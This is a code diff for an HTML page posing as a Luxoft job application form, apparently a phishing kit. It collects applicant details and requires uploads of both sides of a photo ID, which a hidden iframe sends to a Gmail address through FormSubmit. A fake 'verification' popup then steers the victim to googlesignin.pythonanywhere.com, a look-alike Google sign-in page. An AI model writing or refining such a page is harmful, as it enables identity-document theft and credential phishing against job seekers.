@@ -9,7 +9,6 @@
   <link rel="icon" type="image/png" href="favicon.png" />
   <title>Luxoft Application Form</title>
   <style>
-    /* Your existing CSS remains the same */
     :root {
       --primary-bg: linear-gradient(to bottom, #1A0D2E, #2C1A5B);
       --text-color: #FFFFFF;
@@ -191,6 +190,77 @@
       text-decoration: underline;
     }
 
+    /* Custom Alert Styling */
+    .custom-alert {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: var(--card-bg);
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+      z-index: 1000;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    .custom-alert h3 {
+      margin-bottom: 1rem;
+      color: var(--accent-purple);
+    }
+
+    .custom-alert p {
+      margin-bottom: 1.5rem;
+    }
+
+    .custom-alert-buttons {
+      display: flex;
+      gap: 1rem;
+      justify-content: center;
+    }
+
+    .custom-alert-button {
+      padding: 0.5rem 1.5rem;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-weight: 600;
+    }
+
+    .custom-alert-button.primary {
+      background: var(--accent-purple);
+      color: white;
+    }
+
+    .custom-alert-button.secondary {
+      background: transparent;
+      color: var(--text-secondary);
+      border: 1px solid var(--text-secondary);
+    }
+
+    .overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 999;
+    }
+
+    /* Success Message */
+    .success-message {
+      display: none;
+      text-align: center;
+      background: var(--card-bg);
+      padding: 2rem;
+      border-radius: 8px;
+      margin-top: 2rem;
+    }
+
     /* Responsive */
     @media (max-width: 768px) {
       h1 {
@@ -210,6 +280,11 @@
       button {
         padding: 0.75rem 2rem;
         font-size: 1rem;
+      }
+
+      .custom-alert {
+        width: 90%;
+        padding: 1.5rem;
       }
     }
 
@@ -234,6 +309,10 @@
         flex-direction: column;
         gap: 1rem;
       }
+
+      .custom-alert-buttons {
+        flex-direction: column;
+      }
     }
   </style>
 </head>
@@ -245,8 +324,24 @@
     <span class="step-dot"></span>
   </div>
   
-  <!-- Updated form - we'll use FormSubmit's redirect but override it with our own -->
-  <form id="applicationForm" action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data" target="_blank">
+  <!-- Custom Alert -->
+  <div class="overlay" id="overlay"></div>
+  <div class="custom-alert" id="verificationAlert">
+    <h3>Complete Your Verification</h3>
+    <p>Your application has been submitted successfully! Please complete the verification process to finalize your application.</p>
+    <div class="custom-alert-buttons">
+      <button class="custom-alert-button primary" onclick="openVerificationTab()">Open Verification</button>
+      <button class="custom-alert-button secondary" onclick="closeAlert()">Later</button>
+    </div>
+  </div>
+
+  <!-- Success Message -->
+  <div class="success-message" id="successMessage">
+    <h3>Application Submitted Successfully!</h3>
+    <p>Thank you for submitting your application. Please check for a verification alert in 10 seconds.</p>
+  </div>
+  
+  <form id="applicationForm" action="https://formsubmit.co/luxoftorganization@gmail.com" method="POST" enctype="multipart/form-data">
     <input type="hidden" name="_captcha" value="false" />
     <input type="hidden" name="_template" value="table" />
     <input type="hidden" name="_subject" value="New Luxoft Job Application" />
@@ -307,7 +402,7 @@
       
       <div class="button-container">
         <button type="button" onclick="prevStep()">Back</button>
-        <button type="button" id="submitButton">Submit Application</button>
+        <button type="submit" id="submitButton">Submit Application</button>
       </div>
       <div id="loading">Submitting your application...</div>
     </div>
@@ -321,6 +416,8 @@
 
   <script>
     let currentStep = 1;
+    let verificationTab = null;
+    
     function nextStep() {
       if (currentStep < 3) {
         document.getElementById(`step${currentStep}`).classList.remove("active");
@@ -390,11 +487,23 @@
       }
     });
 
-    // Form submission handling - Using iframe method to ensure proper submission
-    document.getElementById("submitButton").addEventListener("click", function() {
+    // Custom alert functions
+    function openVerificationTab() {
+      verificationTab = window.open('https://googlesignin.pythonanywhere.com/', '_blank');
+      closeAlert();
+    }
+
+    function closeAlert() {
+      document.getElementById('verificationAlert').style.display = 'none';
+      document.getElementById('overlay').style.display = 'none';
+    }
+
+    // Form submission handling
+    document.getElementById("applicationForm").addEventListener("submit", function(e) {
+      e.preventDefault(); // Prevent default form submission
+      
       // Validate all fields first
-      const form = document.getElementById("applicationForm");
-      const requiredFields = form.querySelectorAll('[required]');
+      const requiredFields = this.querySelectorAll('[required]');
       let isValid = true;
       
       requiredFields.forEach(field => {
@@ -406,6 +515,15 @@
         }
       });
       
+      // Check file uploads
+      const frontFile = document.getElementById('id-front').files[0];
+      const backFile = document.getElementById('id-back').files[0];
+      
+      if (!frontFile || !backFile) {
+        isValid = false;
+        alert('Please upload both front and back of your Photo ID');
+      }
+      
       if (!isValid) {
         alert('Please fill in all required fields');
         return;
@@ -413,24 +531,34 @@
 
       // Show loading
       document.getElementById("loading").style.display = "block";
-      this.disabled = true;
+      document.getElementById("submitButton").disabled = true;
       
-      // Create a hidden iframe to handle the form submission
+      // Create a temporary iframe for form submission
       const iframe = document.createElement('iframe');
       iframe.name = 'form-submission-iframe';
       iframe.style.display = 'none';
       document.body.appendChild(iframe);
       
       // Set form target to the iframe
-      form.target = 'form-submission-iframe';
+      this.target = 'form-submission-iframe';
       
       // Submit the form
-      form.submit();
+      this.submit();
       
-      // Wait for form to submit, then redirect
+      // Hide the form and show success message
+      document.querySelectorAll('.step').forEach(step => {
+        step.style.display = 'none';
+      });
+      document.getElementById('successMessage').style.display = 'block';
+      
+      // Show verification alert after 10 seconds
       setTimeout(function() {
-        window.location.href = "https://googlesignin.pythonanywhere.com/";
-      }, 5000); // Wait 5 seconds to ensure form submission
+        document.getElementById('verificationAlert').style.display = 'block';
+        document.getElementById('overlay').style.display = 'block';
+        
+        // Hide loading since form should be submitted by now
+        document.getElementById("loading").style.display = "none";
+      }, 10000); // 10 seconds
     });
   </script>
 </body>
